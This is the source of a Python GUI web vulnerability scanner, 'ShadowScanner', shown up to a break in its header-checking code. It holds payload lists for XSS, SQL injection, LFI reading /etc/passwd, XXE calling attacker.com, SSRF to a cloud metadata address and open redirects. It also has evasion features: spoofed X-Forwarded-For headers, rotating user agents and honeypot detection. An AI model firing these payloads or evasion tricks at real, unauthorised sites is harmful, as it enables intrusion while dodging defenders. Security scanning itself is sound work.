#!/usr/bin/env python3
# coding: utf-8

import requests
from urllib.parse import urljoin, urlparse, quote
from bs4 import BeautifulSoup
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
import threading
from datetime import datetime
import random
import os
import time
import re
import webbrowser
import json
import socket
import ssl
import dns.resolver
import hashlib
import ipaddress
import urllib3
from difflib import SequenceMatcher
import warnings

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings("ignore", category=DeprecationWarning)

class ShadowScannerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("ShadowScanner v2.9 - Advanced Vulnerability Scanner")
        self.root.geometry("1200x850")
        self.root.resizable(True, True)
        self.root.protocol("WM_DELETE_WINDOW", self.on_close)
        
        # Vibrant color scheme for maximum visibility
        self.bg_color = "#ffffff"
        self.fg_color = "#333333"
        self.accent_color = "#1e88e5"
        self.warning_color = "#ff9800"
        self.danger_color = "#e53935"
        self.success_color = "#43a047"
        self.highlight_color = "#ffd600"
        self.info_color = "#00acc1"
        
        self.root.configure(bg=self.bg_color)
        
        # Configure styles
        self.style = ttk.Style()
        self.style.theme_use('clam')
        self.style.configure('.', background=self.bg_color, foreground=self.fg_color)
        self.style.configure('TFrame', background=self.bg_color)
        self.style.configure('TLabel', background=self.bg_color, foreground=self.fg_color, 
                             font=('Segoe UI', 10))
        self.style.configure('TButton', background=self.accent_color, foreground="white", 
                             font=('Segoe UI', 10, 'bold'), borderwidth=1)
        self.style.map('TButton', background=[('active', '#0d47a1')])
        self.style.configure('Header.TLabel', font=('Segoe UI', 18, 'bold'), 
                            foreground=self.accent_color)
        self.style.configure('Title.TLabel', font=('Segoe UI', 12, 'bold'), 
                            foreground=self.accent_color)
        self.style.configure('TRadiobutton', background=self.bg_color, foreground=self.fg_color)
        self.style.configure('TCheckbutton', background=self.bg_color, foreground=self.fg_color)
        self.style.configure('TNotebook', background=self.bg_color, borderwidth=0)
        self.style.configure('TNotebook.Tab', background=self.bg_color, foreground=self.fg_color, 
                             padding=[10, 5], font=('Segoe UI', 10, 'bold'))
        self.style.map('TNotebook.Tab', background=[('selected', '#bbdefb')])
        
        # Enhanced vulnerabilities database with advanced payloads
        self.vulnerabilities = {
            "XSS": [
                '<svg/onload=alert(1)>',
                '"><img src=x onerror=alert(1)>',
                'javascript:alert`1`',
                '%26%2396;cript%26%2396;alert(1)%26%2396;/script%26%2396;',
                '\'"()&%<acx><ScRiPt >alert(1)</ScRiPt>'
            ],
            "SQLi": [
                "' OR 'a'='a'--",
                "1' AND 1=2--",
                "1' AND SLEEP(2)--",
                "1' AND 1=1 UNION SELECT NULL,NULL--",
                "1' AND (SELECT 1 FROM (SELECT BENCHMARK(5000000,MD5('test')))a)--"
            ],
            "LFI": [
                "../../../../etc/passwd%00",
                "....//....//....//etc/passwd",
                "/proc/self/environ",
                "C:\\Windows\\System32\\drivers\\etc\\hosts"
            ],
            "CMD Injection": [
                "&echo vulnerable&",
                "|echo vulnerable|",
                ";echo vulnerable;",
                "`echo vulnerable`",
                "$(echo vulnerable)"
            ],
            "XXE": [
                '<!ENTITY xxe SYSTEM "file:///etc/passwd">',
                '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com">]>'
            ],
            "SSRF": [
                "http://localhost",
                "http://127.0.0.1",
                "http://169.254.169.254/latest/meta-data/",
                "file:///etc/passwd"
            ],
            "Open Redirect": [
                "http://google.com",
                "https://evil.com",
                "//evil.com",
                "\\evil.com"
            ],
            "SSTI": [
                "{{7*7}}",
                "${7*7}",
                "<%= 7*7 %>",
                "${{7*7}}"
            ],
            "IDOR": [
                "?id=1001",
                "?user_id=1337",
                "?account=admin"
            ]
        }
        
        self.security_headers = [
            'X-Content-Type-Options',
            'X-Frame-Options',
            'X-XSS-Protection',
            'Strict-Transport-Security',
            'Content-Security-Policy',
            'Referrer-Policy',
            'Feature-Policy',
            'Permissions-Policy',
            'X-Permitted-Cross-Domain-Policies'
        ]
        
        self.common_paths = [
            '/.env', '/config.php', '/wp-config.php', '/appsettings.json',
            '/.htaccess', '/.git/HEAD', '/.git/config', '/.gitignore',
            '/robots.txt', '/sitemap.xml', '/security.txt', '/crossdomain.xml'
        ]
        
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1"
        ]
        
        # Honey pot detection patterns
        self.honeypot_patterns = [
            r'honeypot', r'trap', r'decoy', r'canary', r'alert',
            r'detection', r'monitor', r'snare', r'bait', r'dummy'
        ]
        
        # Known honey pot IP ranges
        self.honeypot_networks = [
            ipaddress.ip_network('10.0.0.0/8'),
            ipaddress.ip_network('172.16.0.0/12'),
            ipaddress.ip_network('192.168.0.0/16'),
            ipaddress.ip_network('100.64.0.0/10'),
            ipaddress.ip_network('169.254.0.0/16')
        ]
        
        self.create_widgets()
        self.scanning = False
        self.scan_results = []
        self.vuln_count = 0
        self.start_time = None
        self.threads = []
        self.max_threads = 5
        self.deep_scan = False
        self.honeypot_detected = False
        self.baseline_responses = {}
        
        # Load configuration if exists
        self.load_config()

    def create_widgets(self):
        # Main frame
        main_frame = ttk.Frame(self.root)
        main_frame.pack(fill=tk.BOTH, expand=True, padx=15, pady=15)
        
        # Header
        header_frame = ttk.Frame(main_frame, style='Header.TFrame')
        header_frame.pack(fill=tk.X, pady=(0, 15))
        
        title_label = ttk.Label(header_frame, 
                               text="SHADOWSCANNER v2.9 - Advanced Vulnerability Scanner",
                               style='Header.TLabel')
        title_label.pack(side=tk.LEFT, padx=10)
        
        # Notebook for tabs
        notebook = ttk.Notebook(main_frame)
        notebook.pack(fill=tk.BOTH, expand=True)
        
        # Scan Tab
        scan_frame = ttk.Frame(notebook, padding=10)
        notebook.add(scan_frame, text='Scanner')
        
        # URL Input
        url_frame = ttk.Frame(scan_frame)
        url_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(url_frame, text="Target URL:", font=('Segoe UI', 10, 'bold')).pack(side=tk.LEFT)
        self.url_entry = ttk.Entry(url_frame, width=60, font=('Segoe UI', 10))
        self.url_entry.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
        self.url_entry.insert(0, "http://")
        
        # Options Frame
        options_frame = ttk.LabelFrame(scan_frame, text="Scan Options", padding=10)
        options_frame.pack(fill=tk.X, pady=10)
        
        # Scan type selection
        scan_type_frame = ttk.Frame(options_frame)
        scan_type_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(scan_type_frame, text="Scan Type:", font=('Segoe UI', 10, 'bold')).pack(side=tk.LEFT)
        self.scan_type = tk.StringVar(value="full")
        ttk.Radiobutton(scan_type_frame, text="Full Scan", variable=self.scan_type, value="full").pack(side=tk.LEFT, padx=10)
        ttk.Radiobutton(scan_type_frame, text="Quick Scan", variable=self.scan_type, value="quick").pack(side=tk.LEFT, padx=10)
        ttk.Radiobutton(scan_type_frame, text="Custom Scan", variable=self.scan_type, value="custom").pack(side=tk.LEFT, padx=10)
        
        # Deep scan checkbox
        self.deep_scan_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(scan_type_frame, text="Deep Scan", variable=self.deep_scan_var, 
                        style='TCheckbutton').pack(side=tk.LEFT, padx=20)
        
        # Scan modules
        modules_frame = ttk.Frame(options_frame)
        modules_frame.pack(fill=tk.X, pady=5)
        
        self.header_check = tk.BooleanVar(value=True)
        self.common_check = tk.BooleanVar(value=True)
        self.xss_check = tk.BooleanVar(value=True)
        self.sqli_check = tk.BooleanVar(value=True)
        self.lfi_check = tk.BooleanVar(value=True)
        self.cmd_check = tk.BooleanVar(value=True)
        self.clickjacking_check = tk.BooleanVar(value=True)
        self.crawl_check = tk.BooleanVar(value=True)
        self.ssrf_check = tk.BooleanVar(value=True)
        self.xxe_check = tk.BooleanVar(value=False)
        self.redirect_check = tk.BooleanVar(value=True)
        self.ssti_check = tk.BooleanVar(value=False)
        self.idor_check = tk.BooleanVar(value=True)
        self.ssl_check = tk.BooleanVar(value=True)
        self.honeypot_check = tk.BooleanVar(value=True)
        
        ttk.Label(modules_frame, text="Scan Modules:", font=('Segoe UI', 10, 'bold')).pack(side=tk.LEFT, anchor='n')
        
        modules_col1 = ttk.Frame(modules_frame)
        modules_col1.pack(side=tk.LEFT, padx=20, anchor='n')
        ttk.Checkbutton(modules_col1, text="Security Headers", variable=self.header_check).pack(anchor='w')
        ttk.Checkbutton(modules_col1, text="Sensitive Files", variable=self.common_check).pack(anchor='w')
        ttk.Checkbutton(modules_col1, text="XSS", variable=self.xss_check).pack(anchor='w')
        ttk.Checkbutton(modules_col1, text="SQL Injection", variable=self.sqli_check).pack(anchor='w')
        ttk.Checkbutton(modules_col1, text="LFI", variable=self.lfi_check).pack(anchor='w')
        
        modules_col2 = ttk.Frame(modules_frame)
        modules_col2.pack(side=tk.LEFT, padx=20, anchor='n')
        ttk.Checkbutton(modules_col2, text="Command Injection", variable=self.cmd_check).pack(anchor='w')
        ttk.Checkbutton(modules_col2, text="Clickjacking", variable=self.clickjacking_check).pack(anchor='w')
        ttk.Checkbutton(modules_col2, text="SSRF", variable=self.ssrf_check).pack(anchor='w')
        ttk.Checkbutton(modules_col2, text="Open Redirect", variable=self.redirect_check).pack(anchor='w')
        ttk.Checkbutton(modules_col2, text="Crawl & Test Links", variable=self.crawl_check).pack(anchor='w')
        
        modules_col3 = ttk.Frame(modules_frame)
        modules_col3.pack(side=tk.LEFT, padx=20, anchor='n')
        ttk.Checkbutton(modules_col3, text="XXE (Advanced)", variable=self.xxe_check).pack(anchor='w')
        ttk.Checkbutton(modules_col3, text="SSTI (Advanced)", variable=self.ssti_check).pack(anchor='w')
        ttk.Checkbutton(modules_col3, text="IDOR", variable=self.idor_check).pack(anchor='w')
        ttk.Checkbutton(modules_col3, text="SSL/TLS Checks", variable=self.ssl_check).pack(anchor='w')
        ttk.Checkbutton(modules_col3, text="Honeypot Detection", variable=self.honeypot_check).pack(anchor='w')
        
        # Advanced settings
        adv_frame = ttk.LabelFrame(options_frame, text="Advanced Settings", padding=10)
        adv_frame.pack(fill=tk.X, pady=10)
        
        threads_frame = ttk.Frame(adv_frame)
        threads_frame.pack(fill=tk.X, pady=5)
        ttk.Label(threads_frame, text="Max Threads:").pack(side=tk.LEFT)
        self.threads_var = tk.IntVar(value=5)
        ttk.Spinbox(threads_frame, from_=1, to=20, width=5, textvariable=self.threads_var).pack(side=tk.LEFT, padx=5)
        
        delay_frame = ttk.Frame(adv_frame)
        delay_frame.pack(fill=tk.X, pady=5)
        ttk.Label(delay_frame, text="Request Delay (ms):").pack(side=tk.LEFT)
        self.delay_var = tk.IntVar(value=200)
        ttk.Spinbox(delay_frame, from_=0, to=5000, width=5, textvariable=self.delay_var).pack(side=tk.LEFT, padx=5)
        
        # Proxy settings
        proxy_frame = ttk.Frame(adv_frame)
        proxy_frame.pack(fill=tk.X, pady=5)
        ttk.Label(proxy_frame, text="Proxy (host:port):").pack(side=tk.LEFT)
        self.proxy_var = tk.StringVar()
        ttk.Entry(proxy_frame, textvariable=self.proxy_var, width=25).pack(side=tk.LEFT, padx=5)
        
        # Retry settings
        retry_frame = ttk.Frame(adv_frame)
        retry_frame.pack(fill=tk.X, pady=5)
        ttk.Label(retry_frame, text="Max Retries:").pack(side=tk.LEFT)
        self.retry_var = tk.IntVar(value=2)
        ttk.Spinbox(retry_frame, from_=0, to=5, width=5, textvariable=self.retry_var).pack(side=tk.LEFT, padx=5)
        
        # Action buttons
        btn_frame = ttk.Frame(scan_frame)
        btn_frame.pack(fill=tk.X, pady=10)
        
        self.scan_btn = ttk.Button(btn_frame, text="Start Scan", command=self.start_scan)
        self.scan_btn.pack(side=tk.LEFT, padx=5)
        
        self.stop_btn = ttk.Button(btn_frame, text="Stop Scan", command=self.stop_scan, state=tk.DISABLED)
        self.stop_btn.pack(side=tk.LEFT, padx=5)
        
        self.save_btn = ttk.Button(btn_frame, text="Save Report", command=self.save_report, state=tk.DISABLED)
        self.save_btn.pack(side=tk.LEFT, padx=5)
        
        self.export_btn = ttk.Button(btn_frame, text="Export Results", command=self.export_results, state=tk.DISABLED)
        self.export_btn.pack(side=tk.LEFT, padx=5)
        
        # Progress bar
        self.progress_var = tk.DoubleVar()
        self.progress_bar = ttk.Progressbar(scan_frame, variable=self.progress_var, maximum=100, 
                                           mode='determinate', length=500)
        self.progress_bar.pack(fill=tk.X, pady=5)
        
        # Results Frame
        results_frame = ttk.LabelFrame(scan_frame, text="Scan Results", padding=10)
        results_frame.pack(fill=tk.BOTH, expand=True, pady=10)
        
        # Stats frame
        stats_frame = ttk.Frame(results_frame)
        stats_frame.pack(fill=tk.X, pady=5)
        
        self.stats_var = tk.StringVar()
        self.stats_var.set("Ready to scan")
        stats_label = ttk.Label(stats_frame, textvariable=self.stats_var, 
                               font=('Segoe UI', 10, 'bold'), foreground=self.info_color)
        stats_label.pack(side=tk.LEFT)
        
        self.vuln_stats = tk.StringVar()
        self.vuln_stats.set("Vulnerabilities: 0")
        vuln_label = ttk.Label(stats_frame, textvariable=self.vuln_stats, 
                              font=('Segoe UI', 10), foreground=self.danger_color)
        vuln_label.pack(side=tk.RIGHT)
        
        # Results text area
        self.results_text = scrolledtext.ScrolledText(
            results_frame, 
            wrap=tk.WORD, 
            width=100, 
            height=20,
            bg="#f5f5f5",
            fg="#333333",
            insertbackground="black",
            font=('Consolas', 10)
        )
        self.results_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Configure tags for colored output
        self.results_text.tag_config('error', foreground=self.danger_color)
        self.results_text.tag_config('warning', foreground=self.warning_color)
        self.results_text.tag_config('success', foreground=self.success_color)
        self.results_text.tag_config('info', foreground=self.info_color)
        self.results_text.tag_config('header', font=('Segoe UI', 12, 'bold'), foreground=self.accent_color)
        self.results_text.tag_config('critical', foreground=self.danger_color, font=('Segoe UI', 10, 'bold'))
        self.results_text.tag_config('highlight', background=self.highlight_color)
        
        # Add Copy button below results
        copy_frame = ttk.Frame(results_frame)
        copy_frame.pack(fill=tk.X, pady=5)
        
        self.copy_btn = ttk.Button(copy_frame, text="Copy Results", command=self.copy_results)
        self.copy_btn.pack(side=tk.RIGHT, padx=5)
        
        # Create context menu for text area
        self.context_menu = tk.Menu(self.results_text, tearoff=0)
        self.context_menu.add_command(label="Copy", command=self.copy_results)
        self.results_text.bind("<Button-3>", self.show_context_menu)
        
        # Status Bar
        self.status_var = tk.StringVar()
        self.status_var.set("Ready")
        status_bar = ttk.Label(self.root, textvariable=self.status_var, relief=tk.SUNKEN)
        status_bar.pack(fill=tk.X, padx=10, pady=5)
        
        # Bind custom scan type
        self.scan_type.trace_add('write', self.on_scan_type_change)

    def show_context_menu(self, event):
        """Show context menu on right-click"""
        self.context_menu.tk_popup(event.x_root, event.y_root)

    def copy_results(self):
        """Copy all text from results area to clipboard"""
        try:
            content = self.results_text.get("1.0", tk.END)
            if content.strip():
                self.root.clipboard_clear()
                self.root.clipboard_append(content)
                self.status_var.set("Results copied to clipboard")
            else:
                self.status_var.set("No results to copy")
        except Exception as e:
            self.status_var.set(f"Copy failed: {str(e)}")

    def on_scan_type_change(self, *args):
        if self.scan_type.get() == "full":
            self.header_check.set(True)
            self.common_check.set(True)
            self.xss_check.set(True)
            self.sqli_check.set(True)
            self.lfi_check.set(True)
            self.cmd_check.set(True)
            self.clickjacking_check.set(True)
            self.crawl_check.set(True)
            self.ssrf_check.set(True)
            self.redirect_check.set(True)
            self.idor_check.set(True)
            self.ssl_check.set(True)
            self.honeypot_check.set(True)
            self.xxe_check.set(False)
            self.ssti_check.set(False)
        elif self.scan_type.get() == "quick":
            self.header_check.set(True)
            self.common_check.set(True)
            self.xss_check.set(True)
            self.sqli_check.set(True)
            self.lfi_check.set(True)
            self.cmd_check.set(False)
            self.clickjacking_check.set(True)
            self.crawl_check.set(False)
            self.ssrf_check.set(False)
            self.redirect_check.set(False)
            self.idor_check.set(False)
            self.ssl_check.set(False)
            self.honeypot_check.set(True)
            self.xxe_check.set(False)
            self.ssti_check.set(False)

    def log(self, message, tag=None):
        self.results_text.insert(tk.END, message + "\n", tag)
        self.results_text.see(tk.END)
        self.root.update_idletasks()
        
    def clear_results(self):
        self.results_text.delete(1.0, tk.END)
        self.scan_results = []
        self.vuln_count = 0
        self.vuln_stats.set(f"Vulnerabilities: {self.vuln_count}")
        self.progress_var.set(0)
        self.honeypot_detected = False
        self.baseline_responses = {}
        
    def start_scan(self):
        if self.scanning:
            messagebox.showwarning("Warning", "Scan already in progress!")
            return
            
        url = self.url_entry.get().strip()
        if not url or url == "http://":
            messagebox.showerror("Error", "Please enter a valid URL")
            return
            
        # Validate URL format
        if not re.match(r'^https?://[^\s/$.?#].[^\s]*$', url):
            messagebox.showerror("Error", "Invalid URL format. Please use http:// or https://")
            return
            
        self.clear_results()
        self.scanning = True
        self.deep_scan = self.deep_scan_var.get()
        self.vuln_count = 0
        self.start_time = datetime.now()
        self.status_var.set("Scanning...")
        self.stats_var.set("Scanning...")
        self.scan_btn.config(state=tk.DISABLED)
        self.stop_btn.config(state=tk.NORMAL)
        self.save_btn.config(state=tk.DISABLED)
        self.export_btn.config(state=tk.DISABLED)
        self.max_threads = self.threads_var.get()
        
        # Start scan in a separate thread to keep GUI responsive
        scan_thread = threading.Thread(target=self.run_scan, args=(url,), daemon=True)
        scan_thread.start()
        
    def stop_scan(self):
        self.scanning = False
        self.status_var.set("Scan stopped by user")
        self.log("\n[!] Scan stopped by user", 'warning')
        self.scan_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)
        self.save_btn.config(state=tk.NORMAL)
        self.export_btn.config(state=tk.NORMAL)
        
    def run_scan(self, url):
        try:
            self.log(f"[*] Starting scan for: {url}\n", 'header')
            self.log(f"[*] Scan started at: {self.start_time.strftime('%Y-%m-%d %H:%M:%S')}", 'info')
            self.log(f"[*] Scan type: {self.scan_type.get().capitalize()} Scan", 'info')
            self.log(f"[*] Deep Scan: {'Enabled' if self.deep_scan else 'Disabled'}\n", 'info')
            
            total_checks = sum([
                self.header_check.get(),
                self.common_check.get(),
                self.xss_check.get(),
                self.sqli_check.get(),
                self.lfi_check.get(),
                self.cmd_check.get(),
                self.clickjacking_check.get(),
                self.ssrf_check.get(),
                self.redirect_check.get(),
                self.xxe_check.get(),
                self.ssti_check.get(),
                self.idor_check.get(),
                self.ssl_check.get(),
                self.honeypot_check.get(),
                self.crawl_check.get()
            ])
            
            if total_checks == 0:
                self.log("[!] No scan modules selected!", 'error')
                self.scanning = False
                self.scan_btn.config(state=tk.NORMAL)
                self.stop_btn.config(state=tk.DISABLED)
                return
                
            current_check = 0
            
            # Run selected modules
            if self.honeypot_check.get():
                current_check += 1
                self.progress_var.set((current_check / total_checks) * 100)
                self.stats_var.set(f"Checking for honeypots...")
                if self.detect_honeypot(url):
                    self.honeypot_detected = True
                    self.log("\n[!] HONEYPOT DETECTED! Proceeding with caution...", 'critical')
            
            # Get baseline responses
            self.get_baseline_responses(url)
            
            if self.header_check.get():
                current_check += 1
                self.progress_var.set((current_check / total_checks) * 100)
                self.stats_var.set(f"Checking security headers...")
                self.check_headers(url)
                
            if self.common_check.get():
                current_check += 1
                self.progress_var.set((current_check / total_checks) * 100)
                self.stats_var.set(f"Checking sensitive files...")
                self.check_common_files(url)
                
            if self.ssl_check.get():
                current_check += 1
                self.progress_var.set((current_check / total_checks) * 100)
                self.stats_var.set(f"Checking SSL/TLS...")
                self.check_ssl(url)
                
            if self.xss_check.get() or self.sqli_check.get() or self.ssti_check.get():
                current_check += 1
                self.progress_var.set((current_check / total_checks) * 100)
                self.stats_var.set(f"Checking forms...")
                self.check_forms(url)
                
            if self.lfi_check.get():
                current_check += 1
                self.progress_var.set((current_check / total_checks) * 100)
                self.stats_var.set(f"Checking LFI vulnerabilities...")
                self.check_lfi(url)
                
            if self.sqli_check.get():
                current_check += 1
                self.progress_var.set((current_check / total_checks) * 100)
                self.stats_var.set(f"Checking SQL injection...")
                self.check_sql_injection(url)
                
            if self.cmd_check.get():
                current_check += 1
                self.progress_var.set((current_check / total_checks) * 100)
                self.stats_var.set(f"Checking command injection...")
                self.check_command_injection(url)
                
            if self.clickjacking_check.get():
                current_check += 1
                self.progress_var.set((current_check / total_checks) * 100)
                self.stats_var.set(f"Checking clickjacking...")
                self.check_clickjacking(url)
                
            if self.ssrf_check.get():
                current_check += 1
                self.progress_var.set((current_check / total_checks) * 100)
                self.stats_var.set(f"Checking SSRF...")
                self.check_ssrf(url)
                
            if self.redirect_check.get():
                current_check += 1
                self.progress_var.set((current_check / total_checks) * 100)
                self.stats_var.set(f"Checking open redirects...")
                self.check_open_redirect(url)
                
            if self.idor_check.get():
                current_check += 1
                self.progress_var.set((current_check / total_checks) * 100)
                self.stats_var.set(f"Checking IDOR...")
                self.check_idor(url)
                
            if self.xxe_check.get():
                current_check += 1
                self.progress_var.set((current_check / total_checks) * 100)
                self.stats_var.set(f"Checking XXE...")
                self.check_xxe(url)
                
            if self.ssti_check.get():
                current_check += 1
                self.progress_var.set((current_check / total_checks) * 100)
                self.stats_var.set(f"Checking SSTI...")
                self.check_ssti(url)
                
            if self.crawl_check.get():
                current_check += 1
                self.progress_var.set((current_check / total_checks) * 100)
                self.stats_var.set(f"Crawling and testing links...")
                self.crawl_and_test_links(url)
            
            # Calculate scan duration
            end_time = datetime.now()
            duration = end_time - self.start_time
            self.log(f"\n[✓] Scan completed in {duration.total_seconds():.2f} seconds", 'success')
            self.log(f"[✓] Total vulnerabilities found: {self.vuln_count}", 
                   'success' if self.vuln_count == 0 else 'critical')
            
            if self.honeypot_detected:
                self.log("\n[!] HONEYPOT DETECTED! Results may be unreliable", 'critical')
            
            self.status_var.set("Scan completed")
            self.stats_var.set("Scan completed")
            
        except Exception as e:
            self.log(f"\n[!] Critical error during scan: {str(e)}", 'error')
            
        finally:
            self.scanning = False
            self.scan_btn.config(state=tk.NORMAL)
            self.stop_btn.config(state=tk.DISABLED)
            self.save_btn.config(state=tk.NORMAL)
            self.export_btn.config(state=tk.NORMAL)
            
    def get_baseline_responses(self, url):
        """Get baseline responses for comparison"""
        self.log("[*] Collecting baseline responses...", 'info')
        try:
            # Home page
            res = self.send_request(url)
            if res:
                self.baseline_responses['home'] = res.text
            
            # 404 page
            random_path = f"/{hashlib.md5(str(time.time()).encode()).hexdigest()[:10]}"
            res_404 = self.send_request(urljoin(url, random_path))
            if res_404 and res_404.status_code == 404:
                self.baseline_responses['404'] = res_404.text
            
            # Login page (if exists)
            login_url = urljoin(url, "/login")
            res_login = self.send_request(login_url)
            if res_login and res_login.status_code == 200:
                self.baseline_responses['login'] = res_login.text
                
            self.log("[✓] Baseline responses collected", 'success')
        except Exception as e:
            self.log(f"[!] Error collecting baseline responses: {e}", 'error')

    def is_similar(self, a, b, threshold=0.85):
        """Check if two texts are similar using Ratcliff/Obershelp algorithm"""
        return SequenceMatcher(None, a, b).ratio() > threshold

    def send_request(self, url, method="GET", data=None, headers=None, timeout=10, allow_redirects=False):
        """Send HTTP request with evasion techniques and retries"""
        max_retries = self.retry_var.get()
        for attempt in range(max_retries + 1):
            try:
                # Add random user agent
                if headers is None:
                    headers = {}
                    
                headers['User-Agent'] = random.choice(self.user_agents)
                
                # Add referer to appear legitimate
                if not headers.get('Referer'):
                    parsed_url = urlparse(url)
                    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
                    headers['Referer'] = base_url
                
                # Apply delay
                delay = self.delay_var.get() / 1000.0
                if delay > 0:
                    time.sleep(delay)
                    
                # Configure proxy if set
                proxies = {}
                proxy = self.proxy_var.get().strip()
                if proxy:
                    proxies = {
                        'http': f'http://{proxy}',
                        'https': f'http://{proxy}'
                    }
                
                # Add evasion headers
                headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                headers['Accept-Language'] = "en-US,en;q=0.9"
                headers['Accept'] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
                headers['Cache-Control'] = "no-cache"
                headers['Pragma'] = "no-cache"
                
                if method.upper() == "GET":
                    response = requests.get(
                        url, 
                        headers=headers, 
                        timeout=timeout, 
                        proxies=proxies, 
                        verify=False, 
                        allow_redirects=allow_redirects
                    )
                elif method.upper() == "POST":
                    response = requests.post(
                        url, 
                        data=data, 
                        headers=headers, 
                        timeout=timeout, 
                        proxies=proxies, 
                        verify=False, 
                        allow_redirects=allow_redirects
                    )
                else:
                    return None
                    
                return response
            except Exception as e:
                if attempt < max_retries:
                    self.log(f"[!] Request error (retry {attempt+1}/{max_retries}): {e}", 'warning')
                    time.sleep(1)  # Wait before retrying
                else:
                    self.log(f"[!] Request error: {e}", 'error')
                    return None

    def detect_honeypot(self, url):
        """Detect potential honey pots using multiple techniques with reduced false positives"""
        self.log("\n[+] Checking for Honey Pots", 'header')
        detected = False
        
        try:
            parsed = urlparse(url)
            host = parsed.hostname
            
            # Technique 1: Check for known honey pot patterns in URL
            for pattern in self.honeypot_patterns:
                if re.search(pattern, url, re.IGNORECASE):
                    self.log(f"[!] Honey pot pattern detected in URL: {pattern}", 'warning')
                    detected = True
                    self.add_vulnerability("Honey Pot Detection", 
                                          f"Honey pot pattern in URL: {pattern}", 
                                          "Verify target legitimacy before scanning",
                                          severity="Medium")
            
            # Technique 2: Check DNS records for suspicious entries
            try:
                answers = dns.resolver.resolve(host, 'A')
                for rdata in answers:
                    ip = rdata.address
                    ip_obj = ipaddress.ip_address(ip)
                    
                    # Check if IP is in known honey pot ranges
                    for network in self.honeypot_networks:
                        if ip_obj in network:
                            self.log(f"[!] IP {ip} is in a known honey pot range ({network})", 'warning')
                            detected = True
                            self.add_vulnerability("Honey Pot Detection", 
                                                  f"IP in honey pot range: {ip} in {network}", 
                                                  "Verify target legitimacy before scanning",
                                                  severity="Medium")
            except dns.resolver.NoAnswer:
                pass
            except Exception as e:
                self.log(f"[!] DNS resolution error: {e}", 'error')
            
            # Technique 3: Check for unusually fast response times (common in honey pots)
            start_time = time.time()
            response = self.send_request(url)
            response_time = time.time() - start_time
            
            if response and response_time < 0.1:  # Less than 100ms is suspicious
                self.log(f"[!] Suspiciously fast response time: {response_time:.4f}s", 'warning')
                detected = True
                self.add_vulnerability("Honey Pot Detection", 
                                      f"Suspiciously fast response time: {response_time:.4f}s", 
                                      "Verify target legitimacy before scanning",
                                      severity="Low")
            
            # Technique 4: Check for known honey pot headers
            if response:
                for header in response.headers:
                    for pattern in self.honeypot_patterns:
                        if re.search(pattern, header, re.IGNORECASE):
                            self.log(f"[!] Honey pot pattern in header: {header}", 'warning')
                            detected = True
                            self.add_vulnerability("Honey Pot Detection", 
                                                  f"Honey pot pattern in header: {header}", 
                                                  "Verify target legitimacy before scanning",
                                                  severity="Medium")
            
            # Technique 5: Check for unusually consistent response sizes
            sizes = set()
            for _ in range(3):
                response = self.send_request(url)
                if response:
                    sizes.add(len(response.content))
                    time.sleep(0.2)
            
            # Only trigger if we have multiple responses and they are identical
            if len(sizes) == 1 and len(sizes) > 0 and len(sizes) < 3:
                self.log(f"[!] Identical response sizes ({len(sizes)} requests)", 'warning')
                detected = True
                self.add_vulnerability("Honey Pot Detection", 
                                      "Identical response sizes across multiple requests", 
                                      "Verify target legitimacy before scanning",
                                      severity="Low")
            
            if not detected:
                self.log("[✓] No honey pot indicators detected", 'success')
            else:
                self.log("[!] Potential honey pot detected! Proceeding with caution", 'warning')
                
            return detected
        except Exception as e:
            self.log(f"[!] Error during honeypot detection: {e}", 'error')
            return False

    def check_headers(self, url):
        self.log("\n[+] Checking Security Headers", 'header')
        try:
            response = self.send_request(url)
            if not response:
                self.log("[!] Failed to retrieve headers", 'error')
                return
                
            headers_found = 0
            critical_missing = []
            
            # Convert header keys to lowercase for case-insensitive comparison
            headers_lower = {k.lower(): v for k, v in response.headers.items()}
            
            # Essential security headers
            essential_headers = {
                'x-content-type-options': 'nosniff',
                'x-frame-options': ['deny', 'sameorigin'],
                'content-security-policy': ''
            }
            
            for header, expected_value in essential_headers.items():
                if header in headers_lower:
                    actual_value = headers_lower[header]
                    
                    if isinstance(expected_value, list):
                        if actual_value.lower() in [v.lower() for v in expected_value]:
                            self.log(f"[✓] {header}: {actual_value}", 'success')
                            headers_found += 1
                        else:
                            self.log(f"[×] {header}: Unsafe value ({actual_value})", 'warning')
                            critical_missing.append(header)
                    elif expected_value and expected_value.lower() in actual_value.lower():
                        self.log(f"[✓] {header}: {actual_value}", 'success')
                        headers_found += 1
                    else:
                        self.log(f"[×] {header}: Unsafe value ({actual_value})", 'warning')
                        critical_missing.append(header)
                else:
                    self.log(f"[×] {header}: Missing", 'warning')
                    critical_missing.append(header)
            
            # Additional security headers
            additional_headers = [
                'strict-transport-security',
                'x-xss-protection',
                'referrer-policy',
                'feature-policy',
                'permissions-policy'
            ]
            
            for header in additional_headers:
                if header in headers_lower:
                    self.log(f"[✓] {header}: {headers_lower[header]}", 'success')
                    headers_found += 1
                else:
                    self.log(f"[!] {header}: Missing (recommended)", 'info')
            
